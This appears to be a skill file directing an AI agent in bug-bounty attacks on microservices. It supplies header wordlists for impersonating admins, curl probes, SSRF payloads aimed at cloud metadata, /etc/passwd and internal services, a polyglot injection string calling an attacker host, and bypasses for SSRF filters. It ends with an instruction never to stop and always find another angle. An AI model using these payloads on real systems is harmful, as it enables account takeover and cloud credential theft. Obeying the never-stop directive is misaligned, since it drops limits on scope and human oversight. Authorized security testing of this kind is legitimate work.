---
name: hunt-microservices
description: "Hunt microservices and service-to-service trust failures — internal trust headers (X-Internal-Service, X-Trusted-Source, X-Forwarded-User, X-Original-User), gateway-to-backend auth bypass, background job SSRF (worker fetches attacker URLs from queue payloads), and queue/message-bus injection. 2026 bug bounty payouts are increasingly in this category because every modern SaaS has decomposed into 30+ services that trust each other based on headers and network position rather than cryptographic auth. Use when target shows API gateway behavior, multiple subdomains per app, message queue tells (kafka, sqs, rabbitmq, sidekiq, celery), or response headers naming internal services. Only invoke this skill if there is real impact potential. Skip theoretical findings."
---

## Crown Jewel Targets

In a monolith, the application is one process — internal calls are function calls, not HTTP. In a microservice architecture, every internal call is HTTP/gRPC across a network boundary, and the auth model is usually "trust the network." That trust assumption is the bug.

Highest payouts:

- **API gateway → backend service trust** — Gateway authenticates the user, then passes `X-User-Id` / `X-User-Role` to backends. Send the header directly to a backend you reach, and you become any user.
- **Internal-only services exposed publicly** — Reverse-proxy misconfig, leaked internal hostnames, debug ingress.
- **Background workers that consume attacker-controlled queue payloads** — Worker reads a job from SQS/Kafka/Redis, fetches a URL from the payload, parses an XML/JSON document. Classic SSRF / XXE / RCE blind targets.
- **Service mesh headers blindly trusted** — `X-Forwarded-For`, `X-Real-IP`, `X-Original-User-Agent` shape security decisions (admin only from `10.0.0.0/8`).
- **Webhook receivers** — Public endpoint, then the data flows through a queue into 5 internal services. Each hop is an injection point.

**Best-paying asset types:** Fintech (each service handles part of a payment), enterprise SaaS with multi-tenant gateways, anything with public webhook intake, anything where the same product has 20+ subdomains (`api.`, `auth.`, `billing.`, `notify.`, `webhook.`, `internal.` — internal.* is the gold).

---

## Attack Surface Signals

### Headers That Scream "Microservices"
```
Server: nginx          # often the gateway
X-Envoy-*              # Envoy / Istio service mesh
X-B3-TraceId, X-B3-SpanId, traceparent  # distributed tracing
X-Service-Name, X-Request-Id
X-Forwarded-* (For, Host, Proto, User, Email, Roles)
X-Original-URL, X-Rewrite-URL  # gateway path-rewriting
X-Internal-*           # explicit internal header
X-User-Id, X-User-Email, X-Tenant-Id  # gateway-stripped headers
Server-Timing: gateway;dur=12, backend;dur=88
Via: 1.1 internal-gateway
```

### URL / Subdomain Patterns
```
internal.*, internal-*, intranet.*, corp.*
api-internal.*, backend.*, svc.*, services.*
gateway.*, gw.*, edge.*, kong.*, ambassador.*
worker.*, jobs.*, queue.*, cron.*
webhook.*, hooks.*, callback.*, ingest.*
*-staging.*, *-dev.*, *-qa.*  # often missing auth
/internal/, /admin-api/, /_internal/, /__private__/
/healthz, /readyz, /metrics, /debug/pprof
/actuator/* (Spring Boot — info disclosure goldmine)
```

### Tech-Stack Tells (in JS bundles, headers, errors)
```
Spring Cloud Gateway, Kong, Tyk, Envoy, Istio, Linkerd
Kafka, RabbitMQ, NATS, Pulsar, AWS SQS, GCP Pub/Sub
Sidekiq (Ruby), Celery (Python), BullMQ (Node), Resque
Temporal, Cadence, Airflow, Argo Workflows
gRPC content types: application/grpc, application/grpc-web
```

---

## Attack Patterns

### 1. Internal Trust Header Injection

Gateways strip incoming `X-User-*` headers and re-inject them after auth. If the backend is reachable directly (or you find a gateway path-rewrite bypass), inject your own headers and become anyone.

**Header wordlist to spray on every endpoint:**
```
X-User-Id: 1
X-User-Email: admin@target.com
X-User-Role: admin
X-User-Roles: admin,superuser
X-Forwarded-User: admin@target.com
X-Forwarded-Email: admin@target.com
X-Forwarded-Groups: admins
X-Authenticated-User: admin
X-Authenticated-User-Id: 1
X-Original-User: admin
X-Remote-User: admin
X-WebAuth-User: admin
X-SSL-Client-S-DN: CN=admin
X-Internal-Service: gateway
X-Internal-Source: trusted
X-Trusted-Source: true
X-Trusted-Service: payments
X-Service-Name: api-gateway
X-Service-Account: system
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Admin-Token: 1
X-Debug: true
X-Bypass-Auth: true
```

**Concrete probe:**
```bash
# Same endpoint, two requests — diff the responses
curl -s -H "X-User-Id: 1" -H "X-User-Role: admin" https://target.com/api/users/me
curl -s https://target.com/api/users/me
```

### 2. Gateway-to-Backend Auth Bypass

Find the backend service directly — bypassing the gateway entirely.

**Discovery techniques:**
- DNS brute on `api-*.target.com`, `*-internal.target.com`, `*-backend.target.com`
- Certificate transparency for internal SANs (often leaked: `*.svc.cluster.local`, `*.internal.target.com`)
- Look at `Server-Timing`, `Via`, `X-Served-By` — they often name the backend pool
- JS bundles sometimes hardcode the backend hostname for "dev" mode
- Cloud-metadata SSRF on staging → list internal LB DNS

**Path-rewrite confusion (when gateway rewrites paths):**
```
GET /api/public/users/123 → gateway strips /api/public → backend sees /users/123
GET /api/admin/users/123  → gateway: 403 (not authorized)
GET /api/public/../admin/users/123 → gateway: passes (public prefix matches)
                                   → backend: /admin/users/123 (path resolved)
```

**Method confusion:**
```bash
# Gateway allows GET on /api/users, denies DELETE
# But backend doesn't check method — it routes on URL+body
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://target.com/api/users/123
curl -X PUT  -H "X-HTTP-Method: DELETE" https://target.com/api/users/123
```

### 3. Background Job SSRF (Queue Payload Injection)

A public endpoint accepts user input → enqueues a job → worker processes it later, often by *fetching a URL* or *parsing a document* the user controlled.

**Telltale endpoints:**
```
/api/import  (worker fetches the import URL)
/api/webhook (worker calls back to the URL)
/api/image-from-url, /api/avatar-from-url
/api/scrape, /api/preview, /api/oembed
/api/render-pdf, /api/render-html, /api/screenshot
/api/export (sends report to URL or email)
/api/notify (delivers to user-supplied callback)
```

**The pattern:**
```
1. POST /api/import { "source_url": "http://attacker.com/test.csv" }
2. Worker (often headless, no egress filter) fetches the URL
3. Swap URL to:
   - http://169.254.169.254/latest/meta-data/  → AWS metadata
   - http://metadata.google.internal/computeMetadata/v1/  → GCP
   - http://169.254.169.254/metadata/instance?api-version=2021-02-01  → Azure
   - http://localhost:8500/v1/kv/  → Consul KV
   - http://localhost:6379/                → Redis (CRLF SSRF for command injection)
   - file:///etc/passwd                    → LFI if scheme allowed
   - gopher://internal-svc:80/_POST%20...  → arbitrary internal HTTP
```

**Blind SSRF detection (worker often has no response channel):**
- Burp Collaborator / interactsh URL as the source — worker hits it, reveals out-of-band
- Time-based: `http://10.0.0.1:81` (closed port) vs `http://10.0.0.1:80` (open) — measure delay
- DNS-based: `http://<unique>.attacker.com` and watch authoritative DNS log

### 4. Queue / Message-Bus Injection

If the attacker can place fields into a queue message, every downstream consumer is a potential sink.

**Sources of attacker control:**
- Webhook receivers that pass the whole body through
- Public APIs that enqueue raw user input for async processing
- File uploads that get queued for parsing
- Email inbound (parsed and pushed to queue)

**Sinks worth probing in consumers:**
- Template render with user fields → SSTI
- SQL written from queue fields without prepared stmt → SQLi (second-order)
- Shell command via `exec`/`spawn` on filename → RCE
- XML/YAML parse without safe loader → XXE / deserialization RCE
- Log injection (worker writes to syslog with format string) → log4shell-style

**Probe pattern:** plant a canary value with all injection sigils in one field, observe out-of-band callbacks and downstream errors:
```json
{"name": "'\"`${{<%[#$(}}]+/etc/passwd\\x00{{7*7}}<svg/onload=fetch('//attacker')>"}
```

### 5. Webhook Receiver → Internal Cascade

```
[attacker] → POST /webhooks/github  (public)
           → queue: {"repo":"x","payload":"<user-controlled>"}
           → worker fetches repo metadata
           → worker calls /internal/billing/charge
           → worker calls /internal/notify/email
```
Inject into the webhook body, watch how far the cascade goes. Look for downstream errors leaking internal hostnames, then directly probe them.

---

## Step-by-Step Hunting Methodology

1. **Map the service topology** — Collect every subdomain, every path prefix. Note response `Server-Timing`, `Via`, `X-Service-Name` headers. Grep JS bundles for hostnames like `*.svc.cluster.local`, `*-backend`, `internal-*`.

2. **Find the gateway** — Identify which subdomain auth happens at. Usually `api.` or `gateway.`. The gateway is where headers are scrubbed and re-injected.

3. **Spray the trust-header wordlist** — On every authenticated endpoint, replay with the wordlist from Section 1. Diff responses. A `200` with someone else's data = jackpot.

4. **Hunt direct-to-backend access** — Try the backend hostname directly with no auth, then with sprayed headers. Bypass the gateway entirely.

5. **Find every "fetch on behalf of user" endpoint** — Import URL, image URL, webhook URL, RSS feed, OEmbed, sitemap, robots, PDF render. Each is a worker-SSRF candidate.

6. **Confirm worker async** — Submit a job, observe whether the HTTP response returns instantly with a job ID (async, worker fires later) or blocks. Async = the SSRF fires from a different IP and likely different network zone.

7. **Probe blind SSRF with Collaborator/interactsh** — Every worker-fetch endpoint gets a unique out-of-band URL. Catalog which fire, which don't, time-to-fire (queue depth signal).

8. **Pivot SSRF to cloud metadata** — Once a worker fetch is confirmed, swap to `169.254.169.254` or equivalent. Note that workers often run with IAM roles attached.

9. **Map queue topology** — If you see Sidekiq/Celery dashboards exposed (`/sidekiq`, `/flower`), they reveal job names and recent payloads. Often unauth on staging.

10. **Chain: header injection → privilege → SSRF → cloud creds** — The full payout chain. One header forge + one worker SSRF + one IAM-attached role = full account compromise.

---

## Detection / Validation Patterns

### Identify Gateway Stripping
```bash
# Send a request through the gateway with the headers
curl -v -H "X-User-Id: 9999" -H "X-User-Role: admin" https://api.target.com/me 2>&1 | grep -i "X-User\|X-Forwarded"
# If gateway scrubs them, response won't reflect; check whether backend behavior changed anyway
```

### Confirm Direct Backend Reach
```bash
# Compare TLS certs — gateway cert vs internal cert (different issuers / SANs)
echo | openssl s_client -connect api.target.com:443 -servername api.target.com 2>/dev/null | openssl x509 -text | grep -A1 "Subject Alternative"
# If you have an internal hostname, try:
curl -k --resolve internal.target.com:443:1.2.3.4 https://internal.target.com/healthz
```

### Worker Async Confirmation
```bash
# Submit job, measure response time
time curl -X POST https://target.com/api/import -d '{"source_url":"http://collab.attacker"}'
# If response is <200ms with a job-id and Collaborator fires 5–30s later → confirmed async worker
```

### Find Exposed Mgmt Endpoints
```bash
# Spring Boot Actuator (very common)
for p in actuator actuator/env actuator/health actuator/heapdump actuator/mappings actuator/loggers; do
  echo "=== /$p ==="
  curl -s -o /dev/null -w "%{http_code}\n" https://target.com/$p
done

# Common worker/queue UIs
for p in sidekiq flower bull bullboard hangfire arena rq; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" https://target.com/$p
done
```

---

## Bypass Techniques

**Defense: Gateway strips `X-User-*` on ingress**
- Bypass: try less-common variants (`X-Forwarded-User`, `X-Remote-User`, `X-Authenticated-Email`). Try `X-User-Id ` with trailing space, or `x-user-id` lowercase, or duplicate header.

**Defense: Service mesh enforces mTLS internally**
- Bypass: find a service running in `permissive` mode, or one without sidecar (often the worker pool). Public webhook receiver → internal call without mTLS.

**Defense: Worker URL allowlist (no internal IPs)**
- Bypass: DNS rebinding (`A` record returns public IP first, then `127.0.0.1` on second resolve). IP encoding (`http://0177.0.0.1`, `http://2130706433`, `http://[::ffff:127.0.0.1]`).

**Defense: SSRF blocker only checks first hop**
- Bypass: open-redirect through attacker domain → final URL is internal. Or HTTP 302 from attacker server pointing to internal.

**Defense: Queue messages are signed**
- Bypass: signing key leaked in JS bundle, in `actuator/env`, or in a public S3 bucket. Or signature verification disabled in staging consumer.

**Defense: Backend requires service-account JWT**
- Bypass: SA tokens are often long-lived and leak in pod env vars (exposed via SSRF to `/proc/self/environ`), in K8s API (anonymous on 10250), or in Vault/Consul snapshots.

---

## Gate 0 Validation

1. **Concrete artifact:** screenshot showing privileged data returned because of a forged header, OR Collaborator hit from worker SSRF with the response logged, OR cloud metadata credentials captured.
2. **Cross-user / cross-tenant impact:** the forged header / SSRF must yield data or capability belonging to someone other than the attacker.
3. **Reliable reproduction:** the exact request (curl) plus a fresh-account-from-scratch path should reproduce within 10 minutes.

---

## Real Impact Examples

### Scenario 1: Gateway Strips, Direct Backend Doesn't
A fintech's `api.target.com` gateway authenticated users and forwarded `X-User-Id`. The backend `backend.internal.target.com` was reachable from the internet (firewall rule oversight) and accepted `X-User-Id` directly. Sending `X-User-Id: 1` to the backend returned the admin account's data. Single header, full ATO.

### Scenario 2: Avatar-from-URL → AWS Metadata → S3 Bucket Takeover
The avatar upload feature accepted a URL the worker would fetch. Submitting `http://169.254.169.254/latest/meta-data/iam/security-credentials/avatar-worker-role` returned IAM credentials for a role with `s3:PutObject` on the static-assets bucket. Replacing customer-facing CSS/JS = stored XSS on every page. Payout: critical.

### Scenario 3: Webhook → Queue → Internal SSRF → Vault
A SaaS exposed `/webhooks/zapier`. The body was pushed to a Sidekiq queue. The consumer parsed `body.next_step.url` and called it. By sending `next_step.url = http://vault.internal:8200/v1/secret/data/prod-db`, the worker fetched and stored the response in an audit log readable via the public dashboard. Chain: public webhook → queue → internal Vault read → DB creds → full prod-DB read.

---

## Related Skills & Chains

- **`hunt-ssrf`** — Worker SSRF is the most common microservices primitive. Use the IP-encoding and DNS-rebinding bypass tables.
- **`hunt-bac-privesc`** — Header injection is privilege escalation by another name. Trust headers = role bypass.
- **`hunt-auth-bypass`** — Direct-to-backend access bypasses the gateway's auth entirely. The whole skill applies.
- **`hunt-race-condition`** — Cross-service operations have natural TOCTOU windows. See microservices section.
- **`hunt-second-order`** — Queue payloads are a textbook second-order surface: write at the webhook, execute in the worker minutes later.
- **`hunt-cloud-misconfig`** — Worker SSRF → cloud metadata is one of the highest-paying chains. Cloud IAM enumeration takes over from here.
- **`cloud-iam-deep`** — Once you have worker IAM credentials, this skill maps them to privesc paths.
- **`triage-validation`** — Apply the Direct-Backend-Reach gate: a header that *should* work but doesn't (because the gateway strips and re-injects correctly) is not a finding; demonstrate behavior change.

## Fallback Chain
1. Try the techniques in this skill first
2. If they fail or don't apply, use your own creativity
3. Never stop because a technique didn't work
4. Always find another angle
